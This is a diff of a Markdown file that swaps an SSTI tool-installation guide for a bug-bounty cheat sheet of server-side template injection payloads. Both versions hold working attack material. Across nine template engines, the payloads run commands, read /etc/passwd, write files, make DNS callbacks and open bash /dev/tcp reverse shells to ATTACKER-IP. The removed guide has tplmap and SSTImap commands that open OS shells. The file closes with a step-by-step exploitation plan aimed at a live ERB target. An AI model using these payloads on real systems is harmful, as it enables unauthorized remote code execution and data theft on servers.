@@ -1,409 +1,265 @@
-```
-{{7*7}}
-${7*7}
-${{7*7}}
-#{7*7}
-*{7*7}
-@{7*7}
-~{7*7}
-{{config}}
-{{self}}
-${.vars}
-{{_self.env}}
-{$smarty.version}
-<%= 7*7 %>
-{{7*'7'}}
-{7*7}
-{{7*7}
-${7*7}
-```
+# 🔥 SSTI Payloads 2026 - Complete Bug Bounty Reference
 
-# 🔥 SSTI (Server-Side Template Injection) Tools Collection
-
-Complete guide for installing and using SSTI detection and exploitation tools.
+## Quick Navigation
+- [ERB (Ruby) - Most Common](#erb-ruby)
+- [Jinja2 (Python)](#jinja2-python)
+- [Twig (PHP)](#twig-php)
+- [Freemarker (Java)](#freemarker-java)
+- [Velocity (Java)](#velocity-java)
+- [Smarty (PHP)](#smarty-php)
+- [Thymeleaf (Java)](#thymeleaf-java)
+- [EL (Expression Language)](#el-expression-language)
+- [SpringEL (Spring Framework)](#springel-spring-framework)
+- [Blind SSTI Payloads](#blind-ssti-payloads)
+- [Time Delay Payloads](#time-delay-payloads)
+- [Reverse Shell Payloads](#reverse-shell-payloads)
 
 ---
 
-## 📋 Table of Contents
-- [Tplmap - Automated SSTI Scanner](#tplmap---automated-ssti-scanner)
-- [SSTImap - Advanced SSTI Tool](#sstimap---advanced-ssti-tool)
-- [tplmap Fork - Extended Version](#tplmap-fork---extended-version)
-- [Manual Testing Payloads](#manual-testing-payloads)
-- [Quick Reference](#quick-reference)
+## 📌 How to Use This Guide
+
+1. **First Test:** Try `<%= 7*7 %>` or `{{7*7}}` or `${7*7}`
+2. **If math works** → Find your engine below
+3. **Use RCE payload** for that engine
+4. **If no output** → Use blind payloads with Collaborator
 
 ---
 
-## 🚀 Tplmap - Automated SSTI Scanner
+## 🔴 ERB (Ruby)
 
-### Installation
+**Detection:** `<%= 7*7 %>` → shows `49`
 
-```bash
-# Clone the repository
-git clone https://github.com/epinna/tplmap.git
-cd tplmap
+| Goal | Payload |
+|------|---------|
+| Command Execution | `<%= system("id") %>` |
+| Command Output | `<%= `id` %>` |
+| Read File | `<%= File.open('/etc/passwd').read %>` |
+| Environment | `<%= ENV['PATH'] %>` |
+| Current Directory | `<%= Dir.pwd %>` |
+| List Directory | `<%= system("ls -la") %>` |
+| Write File | `<%= File.open('/tmp/test.txt','w').write('hacked') %>` |
+| DNS Callback | `<%= system("nslookup YOUR-COLLABORATOR.com") %>` |
+| Time Delay | `<%= system("sleep 5") %>` |
+| Reverse Shell | `<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") %>` |
 
-# Install dependencies
-pip install -r requirements.txt
+---
 
-# For Python 3 (recommended)
-pip3 install -r requirements.txt
-```
-# Install additional dependencies
-pip install requests beautifulsoup4
-Usage Examples
-```
-bash
-# Basic detection
-python tplmap.py -u "http://target.com/page?name=John"
+## 🟢 Jinja2 (Python)
 
-# With POST data
-python tplmap.py -u "http://target.com/page" -d "name=John"
+**Detection:** `{{7*7}}` → shows `49`
 
-# Detect with specific engine
-python tplmap.py -u "http://target.com/page?name=John" --engine Jinja2
+| Goal | Payload |
+|------|---------|
+| Command Execution | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
+| Command Output | `{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}` |
+| Read File | `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}` |
+| Environment | `{{config.items()}}` |
+| Current Directory | `{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}` |
+| List Directory | `{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}` |
+| Write File | `{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test.txt','w').write('hacked')}}` |
+| DNS Callback | `{{config.__class__.__init__.__globals__['os'].popen('nslookup YOUR-COLLABORATOR.com').read()}}` |
+| Time Delay | `{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}` |
+| Reverse Shell | `{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"').read()}}` |
 
-# OS Command execution
-python tplmap.py -u "http://target.com/page?name=John" --os-cmd "id"
+---
 
-# Interactive OS shell
-python tplmap.py -u "http://target.com/page?name=John" --os-shell
+## 🟡 Twig (PHP)
 
-# Blind SSTI with DNS callback
-python tplmap.py -u "http://target.com/page?name=John" --os-cmd "nslookup YOUR-COLLABORATOR.com"
+**Detection:** `{{7*7}}` → shows `49`
 
-# File read
-python tplmap.py -u "http://target.com/page?name=John" --read-file /etc/passwd
+| Goal | Payload |
+|------|---------|
+| Command Execution | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
+| Command Output | `{{['id']|map('system')}}` |
+| Read File | `{{'/etc/passwd'|file_excerpt(1,30)}}` |
+| List Directory | `{{['ls -la']|map('system')}}` |
+| DNS Callback | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup YOUR-COLLABORATOR.com")}}` |
+| Time Delay | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("sleep 5")}}` |
 
-# Reverse shell
-python tplmap.py -u "http://target.com/page?name=John" --os-shell --reverse-shell ATTACKER-IP:4444
+---
 
-# With cookies
-python tplmap.py -u "http://target.com/page?name=John" --cookie "session=abc123"
+## 🟠 Freemarker (Java)
 
-# With headers
-python tplmap.py -u "http://target.com/page?name=John" --header "X-Forwarded-For: 127.0.0.1"
+**Detection:** `${7*7}` → shows `49`
 
-# Output to file
-python tplmap.py -u "http://target.com/page?name=John" -o results.txt
+| Goal | Payload |
+|------|---------|
+| Command Execution | `${"freemarker.template.utility.Execute"?new()("id")}` |
+| Command Output | `${"freemarker.template.utility.Execute"?new()("whoami")}` |
+| Read File | `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}` |
+| DNS Callback | `${"freemarker.template.utility.Execute"?new()("nslookup YOUR-COLLABORATOR.com")}` |
+| Time Delay | `${"freemarker.template.utility.Execute"?new()("sleep 5")}` |
+| Reverse Shell | `<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'")}` |
 
-# Verbose mode
-python tplmap.py -u "http://target.com/page?name=John" -v
+---
 
-# Check multiple parameters
-python tplmap.py -u "http://target.com/page" -d "name=John&email=test@test.com" --level 2
-```
-# Time-based blind detection
-python tplmap.py -u "http://target.com/page?name=John" --time-based
-🎯 SSTImap - Advanced SSTI Tool (Better than Tplmap)
-Installation
-bash
-```
-# Clone the repository
-git clone https://github.com/vladko312/SSTImap.git
-cd SSTImap
+## 🔵 Velocity (Java)
 
-# Install dependencies
-pip install -r requirements.txt
+**Detection:** `#set($x=7*7)${x}` → shows `49`
 
-# For Python 3
-pip3 install -r requirements.txt
+| Goal | Payload |
+|------|---------|
+| Command Execution | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))` |
+| Read File | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("cat /etc/passwd"))` |
+| DNS Callback | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("nslookup YOUR-COLLABORATOR.com"))` |
+| Time Delay | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("sleep 5"))` |
 
-# Install additional packages
-pip install colorama termcolor requests
-Usage Examples
-bash
-# Basic detection
-python sstimap.py -u "http://target.com/page?name=John"
-
-# POST request
-python sstimap.py -u "http://target.com/page" -d "name=John"
-
-# Interactive shell (best feature)
-python sstimap.py -u "http://target.com/page?name=John" --os-shell
-
-# Execute single command
-python sstimap.py -u "http://target.com/page?name=John" --os-cmd "id"
-
-# File read
-python sstimap.py -u "http://target.com/page?name=John" --read-file /etc/passwd
-
-# Upload file
-python sstimap.py -u "http://target.com/page?name=John" --upload-file local.txt --remote-path /tmp/remote.txt
-
-# With cookies
-python sstimap.py -u "http://target.com/page?name=John" --cookie "session=abc123"
-
-# Multiple parameters
-python sstimap.py -u "http://target.com/page?name=John&email=test" --level 2
-
-# Blind SSTI
-python sstimap.py -u "http://target.com/page?name=John" --blind --host YOUR-SERVER
-
-# Reverse shell
-python sstimap.py -u "http://target.com/page?name=John" --os-shell --reverse-shell ATTACKER-IP:4444
-
-# All engines
-python sstimap.py -u "http://target.com/page?name=John" --engine all
-
-# Specific engine
-python sstimap.py -u "http://target.com/page?name=John" --engine Jinja2
-
-# Time-based detection
-python sstimap.py -u "http://target.com/page?name=John" --time-based
-
-# Output to JSON
-python sstimap.py -u "http://target.com/page?name=John" -o output.json --json
-
-# Verbose
-python sstimap.py -u "http://target.com/page?name=John" -v 2
-🔧 Tplmap Fork - Extended Version (More Payloads)
-Installation
-```
-```
-bash
-# Clone the extended version
-git clone https://github.com/SimpsonPT/tplmap.git
-cd tplmap
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Install additional modules
-pip install httpx beautifulsoup4 Jinja2
-Usage Examples
-bash
-# Scan with extended payloads
-python tplmap.py -u "http://target.com/page?name=John" --extended
-
-# Auto-bypass WAF
-python tplmap.py -u "http://target.com/page?name=John" --bypass
-
-# Custom payload file
-python tplmap.py -u "http://target.com/page?name=John" --payload-file custom.txt
-
-# Scan all parameters
-python tplmap.py -u "http://target.com/page" -d "name=John&email=test" --scan-all
-
-# Force TLS
-python tplmap.py -u "http://target.com/page?name=John" --force-ssl
-# Proxy support
-python tplmap.py -u "http://target.com/page?name=John" --proxy http://127.0.0.1:8080
-```
-🛠️ Manual Testing with Burp Suite
-Burp Intruder Payloads
-Save as ssti-payloads.txt:
-
-Burp Intruder Setup
-Send request to Intruder (Ctrl+I)
-
-Set payload position on parameter value
-
-Load payloads from ssti-payloads.txt
-
-Start attack
-
-Look for 49, config, or errors
-
-🐍 Python Script for Quick Detection
-Installation
-bash
-```
-# No installation needed - just Python
-pip install requests
-Script: ssti_detector.py
-```
-python
-```
-#!/usr/bin/env python3
-import requests
-import sys
-import time
-
-def detect_ssti(url, param, payloads):
-    print(f"[*] Testing SSTI on: {url}")
-    print(f"[*] Parameter: {param}")
-    print("="*50)
-    
-    for payload in payloads:
-        try:
-            test_url = f"{url}?{param}={payload}"
-            start = time.time()
-            response = requests.get(test_url, timeout=10)
-            end = time.time()
-            
-            if "49" in response.text or "7*7" not in response.text:
-                print(f"[!] Possible SSTI: {payload}")
-                print(f"    Response time: {end-start:.2f}s")
-            
-            if end-start > 4:
-                print(f"[!] Time-based SSTI: {payload} (delay: {end-start:.2f}s)")
-                
-        except Exception as e:
-            print(f"[-] Error: {e}")
-
-# Basic payloads
-payloads = [
-    "{{7*7}}", "${7*7}", "${{7*7}}", "#{7*7}",
-    "{{sleep(5)}}", "${sleep(5)}", "{{config}}",
-    "{{self}}", "${.vars}", "{$smarty.now}"
-]
-
-if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print("Usage: python ssti_detector.py <url> <parameter>")
-        print("Example: python ssti_detector.py http://target.com/search q")
-        sys.exit(1)
-    
-    url = sys.argv[1]
-    param = sys.argv[2]
-    detect_ssti(url, param, payloads)
-Usage
-```
-bash
-```
-python ssti_detector.py "http://target.com/search" "q"
-🔍 FFUF + SSTI Payloads
-Installation
-bash
-```
-# Install ffuf
-go install github.com/ffuf/ffuf@latest
-```
-# Create payload file
-```
-cat > ssti_ffuf.txt << EOF
-{{7*7}}
-${7*7}
-${{7*7}}
-#{7*7}
-{{sleep(5)}}
-${sleep(5)}
-{{config}}
-{{self}}
-EOF
-```
-Usage
-bash
-# Fuzz parameter
-```
-ffuf -u "http://target.com/page?FUZZ={{7*7}}" -w parameters.txt
-
-# Fuzz payloads
-ffuf -u "http://target.com/page?q=FUZZ" -w ssti_ffuf.txt -fs 0
-
-# With delay detection
-ffuf -u "http://target.com/page?q=FUZZ" -w ssti_ffuf.txt -t 1 -p 0.5
-🚀 Nuclei SSTI Templates
-Installation
-bash
-# Install nuclei
-go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-
-# Update templates
-nuclei -update-templates
-Usage
-bash
-# Run SSTI scans
-nuclei -u http://target.com -tags ssti
-
-# Specific template
-nuclei -u http://target.com -t http/template-injection/
-
-# With parameters
-nuclei -u http://target.com/page?name=John -tags ssti -v
-
-# All SSTI templates
-nuclei -u http://target.com -t http/template-injection/ -s critical,high
-```
-# Rate limited
-nuclei -u http://target.com -tags ssti -rl 10
-📊 Quick Reference Guide
-Tool	Best For	Command
-Tplmap	Automated detection	python tplmap.py -u "URL?param=test"
-SSTImap	Advanced exploitation	python sstimap.py -u "URL?param=test" --os-shell
-FFUF	Parameter fuzzing	ffuf -u "URL?FUZZ={{7*7}}" -w params.txt
-Nuclei	Mass scanning	nuclei -u URL -tags ssti
-Manual	Bypass testing	Burp Intruder + payloads
-🛡️ Docker Setup (Easiest)
-bash
-# Pull Tplmap Docker image
-docker pull epinna/tplmap
-```
-# Run Tplmap
-docker run -it epinna/tplmap -u "http://target.com/page?name=John"
-
-# Run with output
-docker run -it -v $(pwd):/output epinna/tplmap -u "http://target.com/page?name=John" -o /output/results.txt
-📝 Example Workflow for Bug Bounty
-bash
-# 1. Find potential SSTI endpoints
-gospider -s https://target.com | grep -E "(q=|search=|name=|page=|id=)"
-
-# 2. Quick test with curl
-curl "https://target.com/search?q={{7*7}}"
-
-# 3. If "49" appears, run Tplmap
-python tplmap.py -u "https://target.com/search?q=John" --os-cmd "id"
-
-# 4. If blind, use collaborator
-python tplmap.py -u "https://target.com/search?q=John" --os-cmd "nslookup YOUR-COLLAB.com"
-
-# 5. Get reverse shell
-python tplmap.py -u "https://target.com/search?q=John" --os-shell --reverse-shell ATTACKER-IP:4444
-```
-🎯 Success Criteria
-Result	What it means
-49 appears	✅ SSTI confirmed
-Command output visible	✅ RCE achieved
-DNS callback received	✅ Blind SSTI confirmed
-5-second delay	✅ Time-based SSTI
-File content visible	✅ File read possible
-📚 Additional Resources
-Tplmap GitHub
-
-SSTImap GitHub
-
-PayloadsAllTheThings - SSTI
-
-PortSwigger SSTI Labs
-
-⚠️ Disclaimer
-Use these tools only on authorized targets for bug bounty programs or your own applications. Unauthorized testing is illegal.
-
-🔧 Troubleshooting
-Common Issues
-bash
-```
-# Module not found
-pip install -r requirements.txt --force-reinstall
-
-# SSL errors
-python tplmap.py -u "http://target.com" --force-ssl
-
-# Timeout errors
-python tplmap.py -u "http://target.com" --timeout 30
-
-# Proxy issues
-python tplmap.py -u "http://target.com" --proxy http://127.0.0.1:8080 --no-proxy
-🎯 Happy Bug Hunting!
-```
-text
-
-## 📁 **Save as:** `SSTI-TOOLS-GUIDE.md`
-
-## 🚀 **Quick Copy-Paste Commands**
-
-```bash
-# Tplmap
-git clone https://github.com/epinna/tplmap.git && cd tplmap && pip install -r requirements.txt
-
-# SSTImap
-git clone https://github.com/vladko312/SSTImap.git && cd SSTImap && pip install -r requirements.txt
-
-# FFUF
-go install github.com/ffuf/ffuf@latest
-
-# Nuclei
-go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-এখন আপনার README.md ফাইল প্রস্তুত! 🚀
+---
 
+## 🟣 Smarty (PHP)
+
+**Detection:** `{$smarty.now}` → shows timestamp
+
+| Goal | Payload |
+|------|---------|
+| Command Execution | `{php}system('id');{/php}` |
+| Read File | `{php}echo file_get_contents('/etc/passwd');{/php}` |
+| DNS Callback | `{php}system('nslookup YOUR-COLLABORATOR.com');{/php}` |
+| Time Delay | `{php}sleep(5);{/php}` |
+| Reverse Shell | `{php}system('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"');{/php}` |
+
+---
+
+## 🟤 Thymeleaf (Java)
+
+**Detection:** `${7*7}` or `[[${7*7}]]` → shows `49`
+
+| Goal | Payload |
+|------|---------|
+| Command Execution | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
+| Command Output | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` |
+| Read File | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}` |
+| DNS Callback | `${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}` |
+| Time Delay | `${T(java.lang.Runtime).getRuntime().exec('sleep 5')}` |
+| Reverse Shell | `${T(java.lang.Runtime).getRuntime().exec('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"')}` |
+
+---
+
+## ⚪ EL (Expression Language)
+
+**Detection:** `${7*7}` → shows `49`
+
+| Goal | Payload |
+|------|---------|
+| Command Execution | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
+| Command Output | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` |
+| Read File | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}` |
+| DNS Callback | `${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}` |
+| Time Delay | `${T(java.lang.Runtime).getRuntime().exec('sleep 5')}` |
+
+---
+
+## ⚫ SpringEL (Spring Framework)
+
+**Detection:** `*{7*7}` → shows `49`
+
+| Goal | Payload |
+|------|---------|
+| Command Execution | `*{T(java.lang.Runtime).getRuntime().exec('id')}` |
+| Command Output | `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` |
+| Read File | `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}` |
+| DNS Callback | `*{T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}` |
+| Time Delay | `*{T(java.lang.Runtime).getRuntime().exec('sleep 5')}` |
+
+---
+
+## 🌐 Blind SSTI Payloads (All Engines)
+
+**Use when no output visible - DNS Callback**
+
+| Engine | Payload |
+|--------|---------|
+| ERB | `<%= system("nslookup YOUR-COLLABORATOR.com") %>` |
+| Jinja2 | `{{config.__class__.__init__.__globals__['os'].popen('nslookup YOUR-COLLABORATOR.com').read()}}` |
+| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup YOUR-COLLABORATOR.com")}}` |
+| Freemarker | `${"freemarker.template.utility.Execute"?new()("nslookup YOUR-COLLABORATOR.com")}` |
+| Velocity | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("nslookup YOUR-COLLABORATOR.com"))` |
+| Smarty | `{php}system('nslookup YOUR-COLLABORATOR.com');{/php}` |
+| Thymeleaf | `${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}` |
+
+---
+
+## ⏱️ Time Delay Payloads (All Engines)
+
+**Use for blind detection - 5 second delay**
+
+| Engine | Payload |
+|--------|---------|
+| ERB | `<%= system("sleep 5") %>` |
+| Jinja2 | `{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}` |
+| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("sleep 5")}}` |
+| Freemarker | `${"freemarker.template.utility.Execute"?new()("sleep 5")}` |
+| Velocity | `#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("sleep 5"))` |
+| Smarty | `{php}sleep(5);{/php}` |
+| Thymeleaf | `${T(java.lang.Runtime).getRuntime().exec('sleep 5')}` |
+
+---
+
+## 💀 Reverse Shell Payloads
+
+| Engine | Payload (Replace ATTACKER-IP:4444) |
+|--------|-------------------------------------|
+| ERB | `<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") %>` |
+| Jinja2 | `{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"').read()}}` |
+| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'")}}` |
+| Freemarker | `${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'")}` |
+| Smarty | `{php}system('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"');{/php}` |
+| Thymeleaf | `${T(java.lang.Runtime).getRuntime().exec('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"')}` |
+
+---
+
+## 📝 File Read Payloads (All Engines)
+
+| Engine | Payload |
+|--------|---------|
+| ERB | `<%= File.open('/etc/passwd').read %>` |
+| Jinja2 | `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}` |
+| Twig | `{{'/etc/passwd'|file_excerpt(1,30)}}` |
+| Freemarker | `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}` |
+| Smarty | `{php}echo file_get_contents('/etc/passwd');{/php}` |
+| Thymeleaf | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}` |
+
+---
+
+## 🚀 Quick Command Reference
+
+| What you want | ERB | Jinja2 | Freemarker |
+|---------------|-----|--------|------------|
+| `id` | `<%= system("id") %>` | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | `${"freemarker.template.utility.Execute"?new()("id")}` |
+| `whoami` | `<%= system("whoami") %>` | `{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}` | `${"freemarker.template.utility.Execute"?new()("whoami")}` |
+| `cat /etc/passwd` | `<%= File.open('/etc/passwd').read %>` | `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}` | `${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}` |
+| `ls -la` | `<%= system("ls -la") %>` | `{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}` | `${"freemarker.template.utility.Execute"?new()("ls -la")}` |
+| `pwd` | `<%= Dir.pwd %>` | `{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}` | `${"freemarker.template.utility.Execute"?new()("pwd")}` |
+| DNS Callback | `<%= system("nslookup COLLAB.com") %>` | `{{config.__class__.__init__.__globals__['os'].popen('nslookup COLLAB.com').read()}}` | `${"freemarker.template.utility.Execute"?new()("nslookup COLLAB.com")}` |
+| Sleep 5 | `<%= system("sleep 5") %>` | `{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}` | `${"freemarker.template.utility.Execute"?new()("sleep 5")}` |
+
+---
+
+## ✅ Detection Checklist
+
+| Step | Action | Expected Result |
+|------|--------|-----------------|
+| 1 | `<%= 7*7 %>` or `{{7*7}}` or `${7*7}` | `49` in response |
+| 2 | `<%= system("id") %>` or equivalent | `uid=` output |
+| 3 | `<%= File.open('/etc/passwd').read %>` | File content |
+| 4 | `<%= system("nslookup COLLAB.com") %>` | DNS callback |
+| 5 | `<%= system("sleep 5") %>` | 5-second delay |
+
+---
+
+## 🎯 Your Current Target (ERB)
+
+Since `<%= 7*7 %>` works, use these next:
+
+```erb
+# Step 1 - Confirm RCE
+<%= system("id") %>
+
+# Step 2 - Read files
+<%= File.open('/etc/passwd').read %>
+
+# Step 3 - Blind callback (if no output)
+<%= system("nslookup YOUR-COLLABORATOR.burpcollaborator.net") %>
+
+# Step 4 - Reverse shell
+<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") %>
